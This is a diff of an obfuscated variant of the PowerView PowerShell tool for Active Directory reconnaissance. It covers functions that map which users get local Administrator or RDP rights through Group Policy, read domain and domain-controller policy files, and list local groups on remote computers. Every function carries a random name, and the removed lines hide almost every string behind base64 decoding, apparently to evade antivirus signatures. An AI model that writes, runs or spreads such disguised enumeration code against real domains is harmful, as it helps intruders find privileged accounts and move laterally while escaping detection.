+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $OUComputers
+                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                         $GPOLocalGroupMapping
                     }
                 }
             }
 
             
-            aetbwl @CommonArguments -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2l0ZW9iamVjdGJsLGRpc3Rpbmd1aXNoZWRuYW1l"))) -GPLink $GPOGuid | ForEach-Object {
+            beqjfr @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                 ForEach ($TargetSid in $TargetObjectSIDs) {
-                    $Object = kzvwpf @CommonArguments -Identity $TargetSid -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
+                    $Object = guawbd @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
 
-                    $IsGroup = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU2"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU3"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEy"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEz")))) -contains $Object.samaccounttype
+                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
 
                     $GPOLocalGroupMapping = New-Object PSObject
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $Object.samaccountname
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $Object.objectsid
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) $Domain
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPOname
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPR3VpZA=="))) $GPOGuid
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPOPath
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) $GPOType
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGFpbmVyTmFtZQ=="))) $_.distinguishedname
-                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $_.siteobjectbl
-                    $GPOLocalGroupMapping.PSObject.TypeNames.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0xvY2FsR3JvdXBNYXBwaW5n"))))
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
+                    $GPOLocalGroupMapping.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                     $GPOLocalGroupMapping
                 }
             }
@@ -8363,7 +8367,7 @@ function jvaivy {
 }
 
 
-function wqemhb {
+function aptaqm {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -8382,7 +8386,7 @@ function wqemhb {
 
         [String]
         [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
-        $LocalGroup = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),
+        $LocalGroup = 'Administrators',
 
         [ValidateNotNullOrEmpty()]
         [String]
@@ -8400,7 +8404,7 @@ function wqemhb {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -8420,21 +8424,21 @@ function wqemhb {
 
     BEGIN {
         $CommonArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJJZGVudGl0eQ==")))]) {
-            $Computers = aglnim @CommonArguments -Identity $ComputerIdentity -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsZG5zaG9zdG5hbWU=")))
+        if ($PSBoundParameters['ComputerIdentity']) {
+            $Computers = auxvef @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'
 
             if (-not $Computers) {
-                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Db21wdXRlckxvY2FsR3JvdXBNYXBwaW5nXSBDb21wdXRlciAkQ29tcHV0ZXJJZGVudGl0eSBub3QgZm91bmQuIFRyeSBhIGZ1bGx5IHF1YWxpZmllZCBob3N0IG5hbWUu")))
+                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
             }
 
             ForEach ($Computer in $Computers) {
@@ -8443,27 +8447,27 @@ function wqemhb {
 
                 
                 $DN = $Computer.distinguishedname
-                $OUIndex = $DN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T1U9"))))
+                $OUIndex = $DN.IndexOf('OU=')
                 if ($OUIndex -gt 0) {
                     $OUName = $DN.SubString($OUIndex)
                 }
                 if ($OUName) {
-                    $GPOGuids += tmesuk @CommonArguments -SearchBase $OUName -LDAPFilter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdwbGluaz0qKQ=="))) | ForEach-Object {
-                        Select-String -InputObject $_.gplink -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KFx7KXswLDF9WzAtOWEtZkEtRl17OH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezEyfShcfSl7MCwxfQ=="))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
+                    $GPOGuids += kpvdys @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
+                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                     }
                 }
 
                 
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW51bWVyYXRpbmcgdGhlIHNpdGVuYW1lIGZvcjogezB9"))) -f $($Computer.dnshostname))
-                $ComputerSite = (zzsifw -ComputerName $Computer.dnshostname).SiteName
-                if ($ComputerSite -and ($ComputerSite -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I="))))) {
-                    $GPOGuids += aetbwl @CommonArguments -Identity $ComputerSite -LDAPFilter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdwbGluaz0qKQ=="))) | ForEach-Object {
-                        Select-String -InputObject $_.gplink -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KFx7KXswLDF9WzAtOWEtZkEtRl17OH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezEyfShcfSl7MCwxfQ=="))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
+                Write-Verbose ("Enumerating the sitename for: {0}" -f $($Computer.dnshostname))
+                $ComputerSite = (mspskz -ComputerName $Computer.dnshostname).SiteName
+                if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {
+                    $GPOGuids += beqjfr @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
+                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                     }
                 }
 
                 
-                $GPOGuids | jkijxe @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
+                $GPOGuids | spsthe @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                     $GPOGroup = $_
 
                     if($GPOGroup.GroupMembers) {
@@ -8474,20 +8478,20 @@ function wqemhb {
                     }
 
                     $GPOMembers | ForEach-Object {
-                        $Object = kzvwpf @CommonArguments -Identity $_
-                        $IsGroup = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU2"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU3"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEy"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEz")))) -contains $Object.samaccounttype
+                        $Object = guawbd @CommonArguments -Identity $_
+                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
 
                         $GPOComputerLocalGroupMember = New-Object PSObject
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer.dnshostname
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $Object.samaccountname
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $_
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPOGroup.GPODisplayName
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPR3VpZA=="))) $GPOGroup.GPOName
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPOGroup.GPOPath
-                        $GPOComputerLocalGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) $GPOGroup.GPOType
-                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlcg=="))))
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ComputerName' $Computer.dnshostname
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectSID' $_
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType
+                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                         $GPOComputerLocalGroupMember
                     }
                 }
@@ -8497,7 +8501,7 @@ function wqemhb {
 }
 
 
-function qjewdx {
+function lbepwo {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -8507,7 +8511,7 @@ function qjewdx {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('Source', 'Name')]
         [String]
-        $Policy = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))),
+        $Policy = 'Domain',
 
         [ValidateNotNullOrEmpty()]
         [String]
@@ -8529,50 +8533,50 @@ function qjewdx {
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
         $ConvertArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
-            $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
+        if ($PSBoundParameters['Domain']) {
+            $SearcherArguments['Domain'] = $Domain
+            $ConvertArguments['Domain'] = $Domain
         }
 
-        if ($Policy -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs")))) {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))
+        if ($Policy -eq 'All') {
+            $SearcherArguments['Identity'] = '*'
         }
-        elseif ($Policy -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))) {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezMxQjJGMzQwLTAxNkQtMTFEMi05NDVGLTAwQzA0RkI5ODRGOX0=")))
+        elseif ($Policy -eq 'Domain') {
+            $SearcherArguments['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
         }
-        elseif (($Policy -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluQ29udHJvbGxlcg==")))) -or ($Policy -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))))) {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezZBQzE3ODZDLTAxNkYtMTFEMi05NDVGLTAwQzA0RkI5ODRGOX0=")))
+        elseif (($Policy -eq 'DomainController') -or ($Policy -eq 'DC')) {
+            $SearcherArguments['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
         }
         else {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Policy
+            $SearcherArguments['Identity'] = $Policy
         }
 
-        $GPOResults = glraut @SearcherArguments
+        $GPOResults = xfvvfy @SearcherArguments
 
         ForEach ($GPO in $GPOResults) {
             
-            $GptTmplPath = $GPO.gpcfilesyspath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZg==")))
+            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
 
             $ParseArgs =  @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3B0VG1wbFBhdGg="))) = $GptTmplPath
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0"))) = $True
+                'GptTmplPath' = $GptTmplPath
+                'OutputObject' = $True
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ParseArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }
 
             
-            jsaijp @ParseArgs | ForEach-Object {
-                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPTmFtZQ=="))) $GPO.name
-                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPO.displayname
+            nnsvsg @ParseArgs | ForEach-Object {
+                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
+                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                 $_
             }
         }
@@ -8588,7 +8592,7 @@ function qjewdx {
 
 
 
-function lzoiea {
+function vfyyjs {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -8605,7 +8609,7 @@ function lzoiea {
         [ValidateSet('API', 'WinNT')]
         [Alias('CollectionMethod')]
         [String]
-        $Method = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ"))),
+        $Method = 'API',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -8613,14 +8617,14 @@ function lzoiea {
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            if ($Method -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))) {
+            if ($Method -eq 'API') {
                 
 
                 
@@ -8652,31 +8656,31 @@ function lzoiea {
                         $Offset += $Increment
 
                         $LocalGroup = New-Object PSObject
-                        $LocalGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                        $LocalGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $Info.lgrpi1_name
-                        $LocalGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tbWVudA=="))) $Info.lgrpi1_comment
-                        $LocalGroup.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvY2FsR3JvdXAuQVBJ"))))
+                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer
+                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
+                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
+                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                         $LocalGroup
                     }
                     
                     $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                 }
                 else {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRMb2NhbEdyb3VwXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $Result).Message))
+                    Write-Verbose ("[Get-NetLocalGroup] Error: {0}" -f $(([ComponentModel.Win32Exception] $Result).Message))
                 }
             }
             else {
                 
-                $ComputerProvider = [ADSI]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kQ29tcHV0ZXIsY29tcHV0ZXI=")))
+                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"
 
-                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA="))) } | ForEach-Object {
+                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                     $LocalGroup = ([ADSI]$_)
                     $Group = New-Object PSObject
-                    $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                    $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) ($LocalGroup.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))))
-                    $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk")))),0)).Value)
-                    $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tbWVudA=="))) ($LocalGroup.InvokeGet(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVzY3JpcHRpb24=")))))
-                    $Group.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvY2FsR3JvdXAuV2luTlQ="))))
+                    $Group | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))
+                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)
+                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))
+                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                     $Group
                 }
             }
@@ -8685,13 +8689,13 @@ function lzoiea {
     
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function gmmjsn {
+function wtfsrl {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -8707,12 +8711,12 @@ function gmmjsn {
